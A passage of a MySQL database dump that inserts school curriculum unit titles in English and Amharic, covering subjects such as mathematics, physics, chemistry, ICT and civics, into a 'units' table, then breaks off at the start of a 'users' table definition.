tall are you?',85,'2021-04-26 09:06:28','2021-04-26 09:06:28'),(346,3,'It was hot yesterday',85,'2021-04-26 09:08:08','2021-04-26 09:08:08'),(347,4,'Let\'s keep fit',85,'2021-04-26 09:08:18','2021-04-26 09:08:18'),(348,5,'My House',85,'2021-04-26 09:08:28','2021-04-26 09:08:28'),(349,6,'What time is it?',85,'2021-04-26 09:08:41','2021-04-26 09:08:41'),(350,7,'What would you like to eat?',85,'2021-04-26 09:08:59','2021-04-26 09:08:59'),(351,8,'Where is the market?',85,'2021-04-26 09:09:13','2021-04-26 09:09:13'),(352,9,'What is your uncle\'s job?',85,'2021-04-26 09:11:36','2021-04-26 09:11:36'),(353,10,'Look out! A Lion is coming',85,'2021-04-26 09:12:11','2021-04-26 09:12:11'),(354,11,'What is this made of?',85,'2021-04-26 09:12:35','2021-04-26 09:12:35'),(355,12,'Where were you Yesterday?',85,'2021-04-26 09:13:18','2021-04-26 09:13:18'),(356,1,'እስከ 9 ያሉ የመቁጠሪያ ቁጥሮች',86,'2021-04-26 09:24:58','2021-04-26 09:24:58'),(357,2,'እስከ 9 ያሉ መቁጠሪያ ቁጥሮችን መደመረና መቀነስ',86,'2021-04-26 09:26:12','2021-04-26 09:26:12'),(358,3,'ከ 0 እስከ 20 ያሉ ሙሉ ቁጥሮች',86,'2021-04-26 09:27:25','2021-04-26 09:27:25'),(359,4,'እስከ 20 ያሉ ሙሉ ቁጥሮችን መደመረና መቀነስ',86,'2021-04-26 09:28:12','2021-04-26 09:28:12'),(360,5,'ባህላዊ የመለኪያ ምድቦችን በመጠቀም መለካት',86,'2021-04-26 09:29:21','2021-04-26 09:29:21'),(361,6,'የክፍልፋዮች ፅንስ ሀሳብ መግቢያ',86,'2021-04-26 09:33:53','2021-04-26 09:33:53'),(362,7,'እስከ 20 ባሉ ሙሉ ቁጥሮች ማባዛትና ማካፈል',86,'2021-04-26 09:35:09','2021-04-26 09:35:09'),(363,8,'መስመሮችና ቀላል ምስሎች',86,'2021-04-26 09:35:47','2021-04-26 09:35:47'),(364,9,'እስከ 100 ያሉ ቁጥሮች',86,'2021-04-26 09:37:18','2021-04-26 09:37:18'),(365,10,'የኢትዮጵያ ገንዘቦች',86,'2021-04-26 09:38:14','2021-04-26 09:38:14'),(366,11,'ጊዜ',86,'2021-04-26 09:38:37','2021-04-26 09:38:37'),(367,12,'የመረጃ አያያዝና ቀላል ሒሳባዊ ድርድሮች',86,'2021-04-26 09:40:18','2021-04-26 09:40:18'),(368,1,'እስከ 100 ያሉ ሙሉ ቁጥሮችን መደመርና መቀነስ',87,'2021-04-26 11:37:25','2021-04-26 11:37:25'),(369,2,'ማባዛትና ማካፈል እስከ 100',87,'2021-04-26 11:38:04','2021-04-26 11:38:04'),(370,3,'ልኬት',87,'2021-04-26 11:38:36','2021-04-26 11:38:36'),(371,4,'የክፍልፉዮች ፅንሰ ሀሳብ መግቢያ',87,'2021-04-26 11:40:09','2021-04-26 11:40:09'),(372,5,'ሙሉ ቁጥሮች እስከ 1000',87,'2021-04-26 11:40:55','2021-04-26 11:40:55'),(373,6,'ነጥቦች ፣ ቀጥታ መስመሮች እና ቅርጾች ( ምድሎች )',87,'2021-04-26 11:44:09','2021-04-26 11:44:09'),(374,7,'ገንዘብ',87,'2021-04-26 11:44:25','2021-04-26 11:44:25'),(375,8,'ጊዜ',87,'2021-04-26 11:44:42','2021-04-26 11:44:42'),(376,9,'መረጃ አያያዝና ድርድር',87,'2021-04-26 11:45:24','2021-04-26 11:45:24'),(377,1,'እስከ 10,000 ያሉ ሙሉ ቁጥሮችና ቅደም ተከተላቸው',88,'2021-04-26 12:30:59','2021-04-26 12:30:59'),(378,2,'ልኬት',88,'2021-04-26 12:31:23','2021-04-26 12:31:23'),(379,3,'ክፍልፋዮች',88,'2021-04-26 12:31:46','2021-04-26 12:31:46'),(380,4,'እስከ 10,000 ያሉ ሙሉ ቁጥሮችን መደመርና መቀነስ',88,'2021-04-26 12:33:30','2021-04-26 12:33:30'),(381,5,'እስከ 10,000 ያሉ ሙሉ ቁጥሮችን ማባዛትና ማካፈል',88,'2021-04-26 12:34:36','2021-04-26 12:34:36'),(382,6,'መስመሮችና ቀላል ምስሎች',88,'2021-04-26 12:35:15','2021-04-26 12:35:15'),(383,7,'ገንዘብ',88,'2021-04-26 12:35:32','2021-04-26 12:35:32'),(384,8,'ጊዜ',88,'2021-04-26 12:35:45','2021-04-26 12:35:45'),(385,9,'መረጃ አያያዝ',88,'2021-04-26 12:36:17','2021-04-26 12:36:17'),(386,1,'ሙሉ ቁጥሮች እስክ 1,000,000',89,'2021-04-26 13:46:07','2021-04-26 13:46:07'),(387,2,'እስክ 1,000,000 ባሉ ሙሉ ቁጥሮች ላይ አራቱ የሂሳብ ስሌቶች',89,'2021-04-26 13:47:53','2021-04-26 13:47:53'),(388,3,'ክፍልፋዮችና አስርዮሻዊ ቁጥሮች',89,'2021-04-26 13:49:24','2021-04-26 13:49:24'),(389,4,'ልኬት',89,'2021-04-26 13:49:34','2021-04-26 13:49:34'),(390,5,'የጠለል ምስሎችና ጠጣር ምስሎች',89,'2021-04-26 13:50:47','2021-04-26 13:50:47'),(391,6,'ጊዜ',89,'2021-04-26 13:51:02','2021-04-26 13:51:02'),(392,7,'መረጃ አያያዝ',89,'2021-04-26 13:51:25','2021-04-26 13:51:25'),(393,1,'እኛነታችን',102,'2021-04-29 07:47:34','2021-04-29 07:47:34'),(394,2,'ቤተሰባችን',102,'2021-04-29 07:47:55','2021-04-29 07:47:55'),(395,3,'ትምህርት ቤታችን',102,'2021-04-29 07:48:19','2021-04-29 07:48:19'),(396,4,'ወረዳችን',102,'2021-04-29 07:48:38','2021-04-29 07:48:38'),(397,1,'እኛ',103,'2021-04-29 08:27:29','2021-04-29 08:27:29'),(398,2,'ማኅበረሰባችን',103,'2021-04-29 08:28:11','2021-04-29 08:28:11'),(399,3,'የተፈጥሮ አካባቢያችን',103,'2021-04-29 08:28:43','2021-04-29 08:28:43'),(400,4,'ክፍለ ከተማችን',103,'2021-04-29 08:29:06','2021-04-29 08:29:06'),(401,1,'ምግብና የቤተሰብ ደኅንነት',104,'2021-04-29 08:34:51','2021-04-29 08:34:51'),(402,2,'የተፈጥሮ አካባቢያችን',104,'2021-04-29 08:35:37','2021-04-29 08:35:37'),(403,3,'የማኅበረሰባችን እንቅስቃሴዎች',104,'2021-04-29 08:36:36','2021-04-29 08:36:36'),(404,4,'ከተማችን',104,'2021-04-29 08:36:54','2021-04-29 08:36:54'),(405,1,'ሰውነታችን',105,'2021-04-29 08:43:46','2021-04-29 08:43:46'),(406,2,'የተፈጥሮ አካባቢያችን',105,'2021-04-29 08:44:30','2021-04-29 08:44:30'),(407,3,'ሀገራችን',105,'2021-04-29 09:03:33','2021-04-29 09:03:33'),(408,4,'ማኅበራዊ አካባቢያችን',105,'2021-04-29 09:04:12','2021-04-29 09:04:12'),(409,1,'የኢትዮጵያና የአፍሪካ ቀንድ ሀገራት መገኛና የሕዝቦች አሠፋፈር',106,'2021-05-06 13:02:11','2021-05-06 13:02:11'),(410,2,'መሬትና እና አካባቢዋ',106,'2021-05-06 13:03:01','2021-05-06 13:03:01'),(411,3,'አካባቢያችን',106,'2021-05-06 13:03:23','2021-05-06 13:03:23'),(412,4,'ሕዝባዊ ጉዳዮች',106,'2021-05-06 13:03:47','2021-05-06 13:03:47'),(413,1,'የምሥራቅ አፍሪካ መገኛ ፣ ሕዝቦችና አሠፋፈራቸው',107,'2021-05-06 13:25:28','2021-05-06 13:25:28'),(414,2,'የምንኖርባት መሬት',107,'2021-05-06 13:25:56','2021-05-06 13:25:56'),(415,3,'አካባቢያችን',107,'2021-05-06 13:26:24','2021-05-06 13:26:24'),(416,4,'ሕዝባዊ ጉዳዮች',107,'2021-05-06 13:26:52','2021-05-06 13:26:52'),(417,1,'የምልክት ቋንቋ ምልዑነት',108,'2021-05-07 11:14:02','2021-05-07 11:14:02'),(418,2,'የምግብ ምንጮች',108,'2021-05-07 11:14:28','2021-05-07 11:14:28'),(419,3,'የአውራ አምባ ማህበረሰብ እሴቶች',108,'2021-05-08 12:32:44','2021-05-08 12:32:44'),(420,4,'የትምህርት ጥራት ማረጋገጫ መንገዶች',108,'2021-05-08 12:33:55','2021-05-08 12:33:55'),(421,5,'መስማት የተሳናቸው ባህል መገለጫ ባሕርያት',108,'2021-05-08 12:59:15','2021-05-08 12:59:15'),(422,6,'ባህላዊና ዘመናዊ መጓጓዣ መንገዶች',108,'2021-05-08 13:00:35','2021-05-08 13:00:35'),(423,7,'ውጤታማ የአጠናን ዘዴ',108,'2021-05-08 13:01:25','2021-05-08 13:01:25'),(424,8,'የከተሞች ታሪካዊ ጠቀሜታ',108,'2021-05-08 13:02:17','2021-05-08 13:02:17'),(425,9,'የንብ አካል ክፍሎችና ተግባራቸው',108,'2021-05-08 13:02:59','2021-05-08 13:02:59'),(426,10,'የመረጃ አስተማማኝነት የሚረጋገጥባቸው መንገዶች',108,'2021-05-08 13:04:18','2021-05-08 13:04:18'),(427,1,'የስፖርት ምንነት',109,'2021-05-09 14:31:05','2021-05-09 14:31:05'),(428,2,'የመጀመሪያ የሕክምና ዕርዳታ ምንነትና አስፈላጊነት',109,'2021-05-09 14:32:14','2021-05-09 14:32:14'),(429,3,'እኩልነት ምንድነው',109,'2021-05-09 14:32:40','2021-05-09 14:32:40'),(430,4,'ሥነምግባር እና የሥነምባር መርሖዎች',109,'2021-05-09 14:34:08','2021-05-09 14:34:08'),(431,5,'የማስታወቂያ ጥቅም',109,'2021-05-09 14:34:37','2021-05-09 14:34:37'),(432,6,'የተፈጥሮና ሰው ሠራሽ አደጋዎች',109,'2021-05-09 14:35:32','2021-05-09 14:35:32'),(433,7,'የድርሰት ምንነትና ዓይነቶች',109,'2021-05-09 14:36:12','2021-05-09 14:36:12'),(434,8,'የውኃ አካላት',109,'2021-05-09 14:36:44','2021-05-09 14:36:44'),(435,9,'የኅይል ምንጮች',109,'2021-05-09 14:37:28','2021-05-09 14:37:28'),(436,10,'ሞትና ህይወት',109,'2021-05-09 14:41:51','2021-05-09 14:41:51'),(437,1,'የአፍሪካ ኅብረት',110,'2021-05-09 15:00:07','2021-05-09 15:00:07'),(438,2,'ቃለ መጠይቅ',110,'2021-05-09 15:00:43','2021-05-09 15:00:43'),(439,3,'ባሕላዊ ሕክምና',110,'2021-05-09 15:01:15','2021-05-09 15:01:15'),(440,4,'ትምህርት',110,'2021-05-09 15:01:34','2021-05-09 15:01:34'),(441,5,'ኢትዮጵያዊነት',110,'2021-05-09 15:02:10','2021-05-09 15:02:10'),(442,6,'የውኃ አጠቃቀም',110,'2021-05-09 15:02:36','2021-05-09 15:02:36'),(443,7,'የምልክት ቋንቋ ሥነ ጽሑፍ',110,'2021-05-09 15:19:02','2021-05-09 15:19:02'),(444,8,'ድህነት',110,'2021-05-09 15:19:22','2021-05-09 15:19:22'),(445,9,'ቀይ መስቀል/ቀይ ጨረቃ',110,'2021-05-09 15:20:08','2021-05-09 15:20:08'),(446,10,'ኮምፒውተር',110,'2021-05-09 15:20:28','2021-05-09 15:20:28'),(447,1,'የቤተሰብ ሕግ',111,'2021-05-09 15:29:00','2021-05-09 15:29:00'),(448,2,'ተግባቦት በኢምቋ',111,'2021-05-09 15:29:48','2021-05-09 15:29:48'),(449,3,'የሙስና አስከፊነት',111,'2021-05-09 15:30:20','2021-05-09 15:30:20'),(450,4,'ሳይንስና ቴክኖሎጂን የማስፋፋት ፋይዳ',111,'2021-05-09 15:31:08','2021-05-09 15:31:08'),(451,5,'የተባበሩት መንግሥታት ድርጅት',111,'2021-05-09 15:32:03','2021-05-09 15:32:03'),(452,6,'ዓለምአቀፋዊነት ወይስ ብሔራዊነት?',111,'2021-05-09 15:33:13','2021-05-09 15:33:13'),(453,7,'ሕገወጥ የሰዎች ዝውውር አስከፊ ገጽታ',111,'2021-05-09 15:34:10','2021-05-09 15:34:10'),(454,8,'ራስን ማብቃት',111,'2021-05-09 15:34:27','2021-05-09 15:34:27'),(455,9,'የልማድ አሉታዊ ገጽታ',111,'2021-05-09 15:35:24','2021-05-09 15:35:24'),(456,10,'የፍልስፍና ሚና',111,'2021-05-09 15:35:51','2021-05-09 15:35:51'),(457,1,'Introduction to ICT',53,'2021-05-10 16:24:12','2021-05-10 16:24:12'),(458,2,'Application Software',53,'2021-05-10 16:25:14','2021-05-10 16:25:14'),(459,3,'Information and Computer Security',53,'2021-05-10 16:25:34','2021-05-10 16:25:34'),(460,4,'Application Software',53,'2021-05-10 16:26:08','2021-05-10 16:26:08'),(461,5,'Using Internet',53,'2021-05-10 16:26:24','2021-05-10 16:26:24'),(462,6,'Control and Learning with LOGO',53,'2021-05-10 16:26:58','2021-05-10 16:26:58'),(463,1,'The Number System',57,'2021-05-11 06:22:16','2021-05-11 06:22:16'),(464,2,'Solutions of Equations',57,'2021-05-11 06:22:28','2021-05-11 06:22:28'),(465,3,'Further on Sets',57,'2021-05-11 06:22:41','2021-05-11 06:22:41'),(466,4,'Relations and Functions',57,'2021-05-11 06:22:57','2021-05-11 06:22:57'),(467,5,'Geometry and Measurement',57,'2021-05-11 06:23:14','2021-05-11 06:23:14'),(468,6,'Statistics and Probability',57,'2021-05-11 06:23:32','2021-05-11 06:23:32'),(469,7,'Vectors in Two Dimensions',57,'2021-05-11 06:26:02','2021-05-11 06:26:02'),(470,1,'Vectors',55,'2021-05-14 15:08:02','2021-05-14 15:08:02'),(471,2,'Motion in a straight line',55,'2021-05-14 15:08:24','2021-05-14 15:08:24'),(472,3,'Forces and Newton\'s Laws of motion',55,'2021-05-14 15:08:53','2021-05-14 15:08:53'),(473,4,'Work, Energy and Power',55,'2021-05-14 15:09:13','2021-05-14 15:09:13'),(474,5,'Simple machines',55,'2021-05-14 15:09:44','2021-05-14 15:09:44'),(475,6,'Fluid statics',55,'2021-05-14 15:10:02','2021-05-14 15:10:02'),(476,7,'Temperature and heat',55,'2021-05-14 15:10:18','2021-05-14 15:10:18'),(477,8,'Wave motion and sound',55,'2021-05-14 15:10:41','2021-05-14 15:10:41'),(478,1,'ቋንቋና ህብረተሰብ',39,'2021-05-14 15:34:52','2021-05-14 15:34:52'),(479,2,'ባሕላዊ ጋብቻ',39,'2021-05-14 15:35:19','2021-05-14 15:35:19'),(480,3,'ልቦለድ',39,'2021-05-14 15:35:33','2021-05-14 15:35:33'),(481,4,'ማሕበረሰብና ጤና',39,'2021-05-14 15:36:29','2021-05-14 15:36:29'),(482,5,'ቀና አመለካከት',39,'2021-05-14 15:36:53','2021-05-14 15:36:53'),(483,6,'ግጥም',39,'2021-05-14 15:37:05','2021-05-14 15:37:05'),(484,7,'የአረጋውያን ሚና',39,'2021-05-14 15:37:29','2021-05-14 15:37:29'),(485,8,'ሴቶች በባህል ውስጥ',39,'2021-05-14 15:38:01','2021-05-14 15:38:01'),(486,9,'ሱስ',39,'2021-05-14 15:38:11','2021-05-14 15:38:11'),(487,10,'ሥራና ምርት',39,'2021-05-14 15:38:29','2021-05-14 15:38:29'),(488,1,'ቋንቋና ህብረተሰብ',46,'2021-05-14 16:21:04','2021-05-14 16:21:04'),(489,2,'ቅርሶቻችን',46,'2021-05-14 16:21:21','2021-05-14 16:21:21'),(490,3,'ወግ',46,'2021-05-14 16:21:30','2021-05-14 16:21:30'),(491,4,'ልቦለድ',46,'2021-05-14 16:21:43','2021-05-14 16:21:43'),(492,5,'የቋንቋ ለዛ',46,'2021-05-14 16:22:46','2021-05-14 16:22:46'),(493,6,'ግጥም',46,'2021-05-14 16:22:59','2021-05-14 16:22:59'),(494,7,'አርበኝነት',46,'2021-05-14 16:23:18','2021-05-14 16:23:18'),(495,8,'ትውፊት',46,'2021-05-14 16:23:31','2021-05-14 16:23:31'),(496,9,'ስኬት',46,'2021-05-14 16:23:43','2021-05-14 16:23:43'),(497,10,'ኪነጥበብ',46,'2021-05-14 16:23:58','2021-05-14 16:23:58'),(498,1,'ቋንቋና ሕብረተሰብ',47,'2021-05-14 16:34:05','2021-05-14 16:34:05'),(499,2,'የአማርኛ ቋንቋ አጀማመርና ዕድገት',47,'2021-05-14 16:35:03','2021-05-14 16:35:03'),(500,3,'ሒስ',47,'2021-05-14 16:35:16','2021-05-14 16:35:16'),(501,4,'ሥነጽሑፍ',47,'2021-05-14 16:35:50','2021-05-14 16:35:50'),(502,5,'ሰብዓዊነት',47,'2021-05-14 16:36:19','2021-05-14 16:36:19'),(503,6,'ጥናታዊ ጽሑፍ',47,'2021-05-14 16:36:40','2021-05-14 16:36:40'),(504,7,'ሥነግጥም',47,'2021-05-14 16:36:58','2021-05-14 16:36:58'),(505,8,'ውሳኔ ላይ መድረስ',47,'2021-05-14 16:37:21','2021-05-14 16:37:21'),(506,9,'ህብረተሰብና ጤና',47,'2021-05-14 16:37:47','2021-05-14 16:37:47'),(507,1,'Biotechnology',59,'2021-05-21 08:42:42','2021-05-21 08:42:42'),(508,2,'Heredity',59,'2021-05-21 08:43:04','2021-05-21 08:43:04'),(509,3,'Human biology and health',59,'2021-05-21 08:43:28','2021-05-21 08:43:28'),(510,4,'Food making and growth in plants',59,'2021-05-21 08:43:49','2021-05-21 08:43:49'),(511,5,'Conservation of natural resources',59,'2021-05-21 08:44:09','2021-05-21 08:44:09'),(512,1,'INTRODUCTION TO ORGANIC CHEMISTY',61,'2021-05-21 08:47:22','2021-05-21 08:47:22'),(516,2,'Important Inorganic Compounds',61,'2021-05-24 12:08:25','2021-05-24 12:08:25'),(517,3,'Electrochemistry',61,'2021-05-24 12:08:43','2021-05-24 12:08:43'),(518,4,'Chemistry in industry and environmental pollution',61,'2021-05-24 12:09:17','2021-05-24 12:09:17'),(519,1,'Building a Democratic System',40,'2021-05-24 12:17:20','2021-05-24 12:17:20'),(520,2,'Rule of Law',40,'2021-05-24 12:17:31','2021-05-24 12:17:31'),(521,3,'Equality',40,'2021-05-24 12:17:45','2021-05-24 12:17:45'),(522,4,'Justice',40,'2021-05-24 12:17:58','2021-05-24 12:17:58'),(523,5,'Patriotism',40,'2021-05-24 12:18:09','2021-05-24 12:18:09'),(525,6,'Responsibility',40,'2021-05-24 12:19:47','2021-05-24 12:19:47'),(526,7,'Industriousness',40,'2021-05-24 12:20:09','2021-05-24 12:20:09'),(527,8,'Self-reliance',40,'2021-05-24 12:20:28','2021-05-24 12:20:28'),(528,9,'Saving',40,'2021-05-24 12:20:40','2021-05-24 12:20:40'),(529,10,'Active Community Participation',40,'2021-05-24 12:20:52','2021-05-24 12:20:52'),(530,11,'The Pursuit of Wisdom',40,'2021-05-24 12:21:02','2021-05-24 12:21:02'),(531,1,'Sport and fitness',41,'2021-05-24 12:34:20','2021-05-24 12:34:20'),(532,2,'Health - First Aid',41,'2021-05-24 12:34:34','2021-05-24 12:34:34'),(533,3,'I like reading!',41,'2021-05-24 12:34:45','2021-05-24 12:34:45'),(534,4,'Moral education and personal responsibility',41,'2021-05-24 12:35:07','2021-05-24 12:35:07'),(535,5,'Advertising',41,'2021-05-24 12:35:20','2021-05-24 12:35:20'),(536,6,'Drugs',41,'2021-05-24 12:35:29','2021-05-24 12:35:29'),(537,7,'Natural disasters',41,'2021-05-24 12:35:41','2021-05-24 12:35:41'),(538,8,'Education',41,'2021-05-24 12:35:52','2021-05-24 12:35:52'),(539,9,'Seas and rivers',41,'2021-05-24 12:36:05','2021-05-24 12:36:05'),(540,10,'Energy',41,'2021-05-24 12:39:47','2021-05-24 12:39:47'),(541,11,'Application for jobs or college',41,'2021-05-24 12:40:05','2021-05-24 12:40:05'),(542,12,'Births, weddings and funerals',41,'2021-05-24 12:40:31','2021-05-24 12:40:31'),(543,1,'Map Reading',42,'2021-05-24 15:09:03','2021-05-24 15:09:03'),(544,2,'The physical environment of the world and Ethiopia',42,'2021-05-24 15:09:38','2021-05-24 15:09:38'),(545,3,'World Population',42,'2021-05-24 15:12:41','2021-05-24 15:12:41'),(546,4,'Economic System And Development',42,'2021-05-24 15:13:12','2021-05-24 15:13:12'),(547,1,'Introduction to ICT _',43,'2021-05-25 11:08:02','2021-05-25 11:08:02'),(548,2,'Application Software',43,'2021-05-25 11:08:32','2021-05-25 11:08:32'),(549,3,'Information and Computer Security',43,'2021-05-25 11:08:45','2021-05-25 11:08:45'),(550,4,'Application Software',43,'2021-05-25 11:09:02','2021-05-25 11:09:02'),(551,5,'Using Internet',43,'2021-05-25 11:09:23','2021-05-25 11:09:23'),(552,6,'Control and L earning with LOGO',43,'2021-05-25 11:09:40','2021-05-25 11:09:40'),(553,2,'Exponential and Logarithmic Functions',44,'2021-05-25 11:17:19','2021-05-25 11:17:19'),(554,3,'Solving Inequalities',44,'2021-05-25 11:17:36','2021-05-25 11:17:36'),(555,4,'Coordinate Geometry',44,'2021-05-25 11:17:47','2021-05-25 11:17:47'),(556,5,'Trigonometric Functions',44,'2021-05-25 11:17:58','2021-05-25 11:17:58'),(557,6,'Plane Geometry',44,'2021-05-25 11:18:09','2021-05-25 11:18:09'),(558,7,'Measurement',44,'2021-05-25 11:18:20','2021-05-25 11:18:20'),(560,1,'Motion in 2D',45,'2021-05-25 11:37:41','2021-05-25 11:37:41'),(561,2,'Electrostatics',45,'2021-05-25 11:38:57','2021-05-25 11:38:57'),(562,3,'Current Electricity',45,'2021-05-25 11:39:15','2021-05-25 11:39:15'),(563,4,'Electromagnetism',45,'2021-05-25 11:39:36','2021-05-25 11:39:36'),(564,5,'Introduction to Electronics',45,'2021-05-25 11:39:55','2021-05-25 11:39:55'),(565,6,'Electromagnetic waves and geometrical optics',45,'2021-05-25 11:40:25','2021-05-25 11:40:25'),(567,1,'Fundamental concepts in Chemistry',2,'2021-05-25 12:14:10','2021-05-25 12:14:10'),(568,2,'Atomic Structure and Periodic Table',2,'2021-05-25 12:14:29','2021-05-25 12:14:29'),(570,5,'Chemical Equilibrium and Phase Equilibrium',2,'2021-05-25 12:16:29','2021-05-25 12:16:29'),(571,6,'Carboxylic Acids, Esters, Fats and Oils',2,'2021-05-25 12:16:57','2021-05-25 12:16:57'),(572,6,'Responsibility',49,'2021-05-25 12:24:34','2021-05-25 12:24:34'),(573,7,'Industriousness',49,'2021-05-25 12:24:52','2021-05-25 12:24:52'),(574,8,'Self-Reliance',49,'2021-05-25 12:25:05','2021-05-25 12:25:05'),(575,9,'Saving',49,'2021-05-25 12:25:14','2021-05-25 12:25:14'),(576,10,'Active Community Participation',49,'2021-05-25 12:25:41','2021-05-25 12:25:41'),(577,11,'The Pursuit of Wisdom',49,'2021-05-25 12:26:01','2021-05-25 12:26:01'),(578,1,'Concepts of Economics',5,'2021-05-25 12:33:44','2021-05-25 12:33:44'),(579,2,'Demand, Supply and Elasticity',5,'2021-05-25 12:33:59','2021-05-25 12:33:59'),(580,3,'Theory of Consumer Behavior',5,'2021-05-25 12:34:16','2021-05-25 12:34:16'),(581,4,'Theory of Production and Cost',5,'2021-05-25 12:34:33','2021-05-25 12:34:33'),(582,5,'Market Structures and The Decision of a Firm',5,'2021-05-25 12:35:11','2021-05-25 12:35:11'),(583,6,'The Fundamental concerns of Macroeconomics',5,'2021-05-25 12:35:46','2021-05-25 12:35:46'),(584,7,'National Income Account',5,'2021-05-25 12:36:03','2021-05-25 12:36:03'),(585,8,'Consumption, Saving and Investment',5,'2021-05-25 12:36:29','2021-05-25 12:36:29'),(586,9,'International Trade and Balance of Payments',5,'2021-05-25 12:36:56','2021-05-25 12:36:56'),(587,10,'Macroeconomics policy instruments',5,'2021-05-25 12:37:28','2021-05-25 12:37:28'),(589,4,'HIV and AIDS',58,'2021-05-25 12:59:09','2021-05-25 12:59:09'),(590,5,'Tourism',58,'2021-05-25 12:59:19','2021-05-25 12:59:19'),(591,6,'Fiction',58,'2021-05-25 12:59:28','2021-05-25 12:59:28'),(592,7,'Weather and climate change',58,'2021-05-25 12:59:46','2021-05-25 12:59:46'),(593,8,'Water',58,'2021-05-25 12:59:55','2021-05-25 12:59:55'),(594,9,'Disability',58,'2021-05-25 13:00:03','2021-05-25 13:00:03'),(595,10,'Poverty and development',58,'2021-05-25 13:00:25','2021-05-25 13:00:25'),(596,11,'NGOs',58,'2021-05-25 13:00:34','2021-05-25 13:00:34'),(597,12,'Technological advances',58,'2021-05-25 13:00:50','2021-05-25 13:00:50'),(598,1,'The nature of Business',12,'2021-05-25 13:10:58','2021-05-25 13:10:58'),(599,2,'Type and Forms of Business ownership',12,'2021-05-25 13:11:18','2021-05-25 13:11:18'),(600,3,'Financing Business Organizations',12,'2021-05-25 13:11:39','2021-05-25 13:11:39'),(601,4,'Production',12,'2021-05-25 13:11:51','2021-05-25 13:11:51'),(602,1,'The Science of Geography',51,'2021-05-25 13:39:48','2021-05-25 13:39:48'),(603,2,'Map Reading and Interpretation',51,'2021-05-25 13:40:10','2021-05-25 13:40:10'),(604,3,'An overview of Physical Geography of Africa',51,'2021-05-25 13:40:36','2021-05-25 13:40:36'),(605,4,'Population, Economy and Natural resources of Africa',51,'2021-05-25 13:41:05','2021-05-25 13:41:05'),(606,1,'Information Systems',13,'2021-05-25 13:56:11','2021-05-25 13:56:11'),(607,2,'Enhancing the use of Software',13,'2021-05-25 13:56:51','2021-05-25 13:56:51'),(608,3,'Basic Troubleshooting',13,'2021-05-25 13:57:07','2021-05-25 13:57:07'),(609,4,'Exploiting the Internet',13,'2021-05-25 13:57:21','2021-05-25 13:57:21'),(610,5,'Image Processing and Multimedia Systems',13,'2021-05-25 13:57:48','2021-05-25 13:57:48'),(611,1,'Micro-organisms',20,'2021-05-25 14:06:23','2021-05-25 14:06:23'),(612,2,'Ecology',20,'2021-05-25 14:06:42','2021-05-25 14:06:42'),(613,3,'Genetics',20,'2021-05-25 14:06:56','2021-05-25 14:06:56'),(614,4,'Evolution',20,'2021-05-25 14:07:07','2021-05-25 14:07:07'),(615,5,'Behavior',20,'2021-05-25 14:07:20','2021-05-25 14:07:20'),(616,2,'Acid-Base Equilibrium',22,'2021-05-26 06:21:17','2021-05-26 06:21:17'),(617,3,'Introduction to Chemical Thermodynamics',22,'2021-05-26 06:21:37','2021-05-26 06:21:37'),(618,4,'Electrochemistry',22,'2021-05-26 06:21:49','2021-05-26 06:21:49'),(619,5,'Some Elements in Nature and Industry',22,'2021-05-26 06:22:09','2021-05-26 06:22:09'),(620,6,'Polymers',22,'2021-05-26 06:22:24','2021-05-26 06:22:24'),(621,1,'Building a Democratic System',38,'2021-05-26 06:27:48','2021-05-26 06:27:48'),(622,2,'Rule of Law',38,'2021-05-26 06:27:57','2021-05-26 06:27:57'),(623,3,'Equality',38,'2021-05-26 06:28:06','2021-05-26 06:28:06'),(624,4,'Justice',38,'2021-05-26 06:28:14','2021-05-26 06:28:14'),(625,5,'Patriotism',38,'2021-05-26 06:28:30','2021-05-26 06:28:30'),(626,6,'Responsibility',38,'2021-05-26 06:28:43','2021-05-26 06:28:43'),(627,7,'Industriousness',38,'2021-05-26 06:28:55','2021-05-26 06:28:55'),(628,8,'Self-Reliance',38,'2021-05-26 06:29:07','2021-05-26 06:29:07'),(629,9,'Saving',38,'2021-05-26 06:29:17','2021-05-26 06:29:17'),(630,10,'Active Community Participation',38,'2021-05-26 06:29:38','2021-05-26 06:29:38'),(631,11,'The Pursuit of Wisdom',38,'2021-05-26 06:29:58','2021-05-26 06:29:58'),(632,1,'Family Life',17,'2021-05-26 06:50:53','2021-05-26 06:50:53'),(633,2,'Communication',17,'2021-05-26 06:51:04','2021-05-26 06:51:04'),(634,3,'Education',17,'2021-05-26 06:51:16','2021-05-26 06:51:16'),(635,4,'The arts and literature',17,'2021-05-26 06:51:31','2021-05-26 06:51:31'),(636,5,'The United Nations',17,'2021-05-26 06:51:45','2021-05-26 06:51:45'),(637,6,'Trade and globalisation',17,'2021-05-26 06:51:59','2021-05-26 06:51:59'),(639,7,'Finding a job',17,'2021-05-26 07:05:41','2021-05-26 07:05:41'),(640,8,'human development',17,'2021-05-26 07:05:54','2021-05-26 07:05:54'),(641,9,'Tradition versus progress',17,'2021-05-26 07:06:17','2021-05-26 07:06:17'),(642,10,'Future threats',17,'2021-05-26 07:06:34','2021-05-26 07:06:34'),(643,11,'The film industry',17,'2021-05-26 07:06:47','2021-05-26 07:06:47'),(644,12,'Class magazine',17,'2021-05-26 07:07:21','2021-05-26 07:07:21'),(645,1,'Information Systems',54,'2021-05-26 07:34:27','2021-05-26 07:34:27'),(646,2,'Enhancing the Use of Software',54,'2021-05-26 07:34:42','2021-05-26 07:34:42'),(647,3,'Exploiting the Internet',54,'2021-05-26 07:35:01','2021-05-26 07:35:01'),(648,4,'Image Processing and Multimedia Systems',54,'2021-05-26 07:35:30','2021-05-26 07:35:30'),(649,1,'Thermodynamics',30,'2021-05-26 07:40:20','2021-05-26 07:40:20'),(650,2,'Oscillations and waves',30,'2021-05-26 07:40:33','2021-05-26 07:40:33'),(651,3,'Wave optics',30,'2021-05-26 07:40:43','2021-05-26 07:40:43'),(652,4,'Electrostatics',30,'2021-05-26 07:40:59','2021-05-26 07:40:59'),(653,5,'Steady electric current and circuit properties',30,'2021-05-26 07:41:56','2021-05-26 07:41:56'),(655,6,'Magnetism',30,'2021-05-26 07:45:12','2021-05-26 07:45:12'),(656,7,'Electromagnetic induction and a.c circuits',30,'2021-05-26 07:45:39','2021-05-26 07:45:39'),(657,8,'Atomic physics',30,'2021-05-26 07:45:51','2021-05-26 07:45:51');
/*!40000 ALTER TABLE `units` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
